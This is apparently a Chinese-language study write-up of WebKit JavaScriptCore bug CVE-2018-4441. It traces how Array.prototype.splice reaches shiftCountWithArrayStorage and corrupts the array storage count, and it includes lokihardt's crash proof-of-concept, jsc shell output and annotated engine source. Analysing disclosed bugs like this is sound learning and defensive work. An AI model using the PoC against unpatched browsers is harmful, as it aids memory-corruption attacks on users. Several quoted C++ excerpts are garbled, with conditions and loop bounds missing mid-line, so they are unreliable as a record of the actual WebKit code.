这个洞是[lokihardt](https://bugs.chromium.org/p/project-zero/issues/detail?id=1685) 发现的，比较简单，适合入门，这里记录一下学习的过程，理解有误望指正。
### 漏洞分析
#### 环境配置
这里我用了补丁的前一个版本 commit `21687be235d506b9712e83c1e6d8e0231cc9adfd` , 在 ubuntu
1804 下编译，环境相关的文件都放在了[这里](https://github.com/rtfingc/cve-repo/tree/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage)
#### 漏洞描述
漏洞发生在`JSArray::shiftCountWithArrayStorage` 这个函数，根据lokihardt 的描述，除非对象的prototype
有indexed accessors 或者 proxy对象(我也不清楚是什么:( ),
否则调用到这个函数的时候`holesMustForwardToPrototype` 都会返回`false`, 本来带holes
的对象就可以进入下面的处理逻辑(总的来说就是代码写错了)
    bool JSArray::shiftCountWithArrayStorage(VM& vm, unsigned startIndex, unsigned count, ArrayStorage* storage)
    {
        unsigned oldLength = storage->length();
        RELEASE_ASSERT(count hasHoles() && this->structure(vm)->holesMustForwardToPrototype(vm, this)) 
            || hasSparseMap() 
            || shouldUseSlowPut(indexingType())) {
            return false;
        }
        if (!oldLength)
            return true;
        unsigned length = oldLength - count;
        storage->m_numValuesInVector -= count;
        storage->setLength(length);
    //.....
    bool Structure::holesMustForwardToPrototype(VM& vm, JSObject* base) const
    {
        ASSERT(base->structure(vm) == this);
        if (this->mayInterceptIndexedAccesses())
            return true;
        JSValue prototype = this->storedPrototype(base);//
        if (!prototype.isObject())
            return false;
        JSObject* object = asObject(prototype);
        while (true) {
            Structure& structure = *object->structure(vm);
            if (hasIndexedProperties(object->indexingType()) || structure.mayInterceptIndexedAccesses())
                return true;
            prototype = structure.storedPrototype(object);
            if (!prototype.isObject())
                return false;
            object = asObject(prototype);
#### poc 分析
    function main() {
        let arr = [1];
        arr.length = 0x100000;
        arr.splice(0, 0x11);
        arr.length = 0xfffffff0;
        arr.splice(0xfffffff0, 0, 1);
    }
    main();
`lokihardt` 给出了poc
    ./jsc
    >>> a=[1]
    1
    >>> describe(a)
    Object: 0x7fffaf6b4340 with butterfly 0x7fe0000e4008 (Structure 0x7fffaf6f2a00:[Array, {}, ArrayWithInt32, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 97
    >>> a.length=0x100000
    1048576
    >>> describe(a)
    Object: 0x7fffaf6b4340 with butterfly 0x7fe0000f8448 (Structure 0x7fffaf6f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 100
    >>> a.splice(0,0x11)
    1,,,,,,,,,,,,,,,,
首先创建了一个 `ArrayWithInt32` 类型的array, length 改成`0x100000`
之后会转换成`ArrayWithArrayStorage`, 然后调用 `splice`
函数，实现在`Source/JavaScriptCore/runtime/ArrayPrototype.cpp:1005`
的`arrayProtoFuncSplice` 函数
splice 用来删除修改array, 如 `a.splice(0, 0x11)`, 就表示从`index=0` 开始删除0x11 项，
第三个参数表示要替换的内容， 如`a.splice(0,0x11,1,1)` 表示删除 0x11 个项，然后添加两个项，内容都是1,
也可以这`a.splice(0,1,1,2,3)` 要添加的项比删除多的时候会重新分配内存。我们看一下函数具体是怎么样实现的， 这里用poc 的
`a.length=0x100000; a.splice(0,0x11)` 为例
    EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)
    {
        // 15.4.4.12
        VM& vm = exec->vm();
        auto scope = DECLARE_THROW_SCOPE(vm);
        JSObject* thisObj = exec->thisValue().toThis(exec, StrictMode).toObject(exec);
        EXCEPTION_ASSERT(!!scope.exception() == !thisObj);
        if (UNLIKELY(!thisObj))
            return encodedJSValue();
        // length = 0x100000
        unsigned length = toLength(exec, thisObj);
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
        if (!exec->argumentCount()) {
    //..
        }
        // splice 第一个参数， 这里是 0
        unsigned actualStart = argumentClampedIndexFromStartOrEnd(exec, 0, length);
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
        // actualDeleteCount = 0x100000 - 0
        unsigned actualDeleteCount = length - actualStart;
        // argumentCount == 2, 进入判断， actualDeleteCount = 0x11
        if (exec->argumentCount() > 1) {
            double deleteCount = exec->uncheckedArgument(1).toInteger(exec);
            RETURN_IF_EXCEPTION(scope, encodedJSValue());
            if (deleteCount  length - actualStart)
                actualDeleteCount = length - actualStart;
            else
                actualDeleteCount = static_cast(deleteCount);
        }
    //...
        // itemCount 表示要添加的 item 数量， 这里是 0  调用 shift
        unsigned itemCount = std::max(exec->argumentCount() - 2, 0);
        if (itemCount (exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
            RETURN_IF_EXCEPTION(scope, encodedJSValue());
        } else if (itemCount > actualDeleteCount) {
            unshift(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
            RETURN_IF_EXCEPTION(scope, encodedJSValue());
        }
        // 把每个添加的item 内容写入
        for (unsigned k = 0; k putByIndexInline(exec, k + actualStart, exec->uncheckedArgument(k + 2), true);
            RETURN_IF_EXCEPTION(scope, encodedJSValue());
        }
     // 重新设置长度   
        scope.release();
        setLength(exec, vm, thisObj, length - actualDeleteCount + itemCount);
        return JSValue::encode(result);
    }
整理一下
  * `actualStart` 第一个参数，表示要开始delete 的地方
  * `actualDeleteCount` 第二个参数，要delete 的数量，没有设置时默认是`length - actualStart`
  * `itemCount` 第三个参数开始的数量
    * `itemCount  actualDeleteCount` 调用 unshift
我们跟一下`shift`
    template
    void shift(ExecState* exec, JSObject* thisObj, unsigned header, unsigned currentCount, unsigned resultCount, unsigned length)
    {
        VM& vm = exec->vm();
        auto scope = DECLARE_THROW_SCOPE(vm);
        RELEASE_ASSERT(currentCount > resultCount);
        // 要多 delete 的数量
        unsigned count = currentCount - resultCount;
        RELEASE_ASSERT(header length() == length && array->shiftCount(exec, header, count))
                return;
        }
        for (unsigned k = header; k putByIndexInline(exec, to, value, true);
                RETURN_IF_EXCEPTION(scope, void());
            } else {
                bool success = thisObj->methodTable(vm)->deletePropertyByIndex(thisObj, exec, to);
                RETURN_IF_EXCEPTION(scope, void());
                if (!success) {
                    throwTypeError(exec, scope, UnableToDeletePropertyError);
                    return;
                }
            }
        }
        for (unsigned k = length; k > length - count; --k) {
            // 
            bool success = thisObj->methodTable(vm)->deletePropertyByIndex(thisObj, exec, k - 1);
            RETURN_IF_EXCEPTION(scope, void());
            if (!success) {
                throwTypeError(exec, scope, UnableToDeletePropertyError);
                return;
            }
        }
    }
`JSArray::ShiftCountForSplice`
实现在`Source/JavaScriptCore/runtime/JSArray.h:125`,
`shiftCountWithAnyIndexingType` 根据 array
的类型做不同的处理，这里我们是`ArrayWithArrayStorage`, 直接调用`shiftCountWithArrayStorage`
    bool shiftCountForSplice(ExecState* exec, unsigned& startIndex, unsigned count)        
    {                                                                                      
        return shiftCountWithAnyIndexingType(exec, startIndex, count);                     
    }                                                                                      
    //.................
    bool JSArray::shiftCountWithAnyIndexingType(ExecState* exec, unsigned& startIndex, unsigned count)
    {
        VM& vm = exec->vm();
        RELEASE_ASSERT(count > 0);
        ensureWritable(vm);
        Butterfly* butterfly = this->butterfly();
        switch (indexingType()) {
        case ArrayClass:
            return true;
        case ArrayWithUndecided:
            // Don't handle this because it's confusing and it shouldn't come up.
            return false;
        case ArrayWithInt32:
        case ArrayWithContiguous: {
            unsigned oldLength = butterfly->publicLength();
        //...
            return true;
        }
        case ArrayWithDouble: {
            unsigned oldLength = butterfly->publicLength();
            RELEASE_ASSERT(count length();
        RELEASE_ASSERT(count hasHoles() && this->structure(vm)->holesMustForwardToPrototype(vm, this)) 
            || hasSparseMap() 
            || shouldUseSlowPut(indexingType())) {
            return false;
        }
        if (!oldLength)
            return true;
        //count = 0x11, oldlength = 0x100000, length = 0xfffef
        unsigned length = oldLength - count;
        // m_numValuesInVector = 1, 计算之后 m_numValuesInVector = 0xfffffff0
        storage->m_numValuesInVector -= count;
        storage->setLength(length);
这里运行结束后`a.length = 0xfffef`, `storage.m_numValuesInVector = 0xfffffff0`, 然后
poc 下一步设置`a.length = 0xfffffff0`, 这样就有 `a.length ==
storage.m_numValuesInVector`, 这样`hasHoles` 后续都会返回false
    bool hasHoles() const                         
    {                                             
        return m_numValuesInVector != length();   
    }
最后一步`a.splice(0xfffffff0, 0, 1);`, `itemCount == 1 > actualDeleteCount == 0`,
于是就会进入 `unshift` 函数， 和 shift 函数类似，这里最终会进入 `JSArray`
的`unshiftCountWithArrayStorage`
因为 `storage->hasHoles()` 返回的是 false, 所以可以进入后面的判断，要添加的item 比
delete的多，那么就需要扩大原来的内存，后续的内存操作会出现问题，最终`segmentfault`
    bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage)
    {
    //..
        // If the array contains holes or is otherwise in an abnormal state,
        // use the generic algorithm in ArrayPrototype.
        if (storage->hasHoles() || storage->inSparseMode() || shouldUseSlowPut(indexingType()))
            return false;
        bool moveFront = !startIndex || startIndex vectorLength();
        // Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in
        // a weird state: some parts of it will be left uninitialized, which we will fill in here.
        DeferGC deferGC(vm.heap);
        auto locker = holdLock(cellLock());
        if (moveFront && storage->m_indexBias >= count) {
            Butterfly* newButterfly = storage->butterfly()->unshift(structure(vm), count);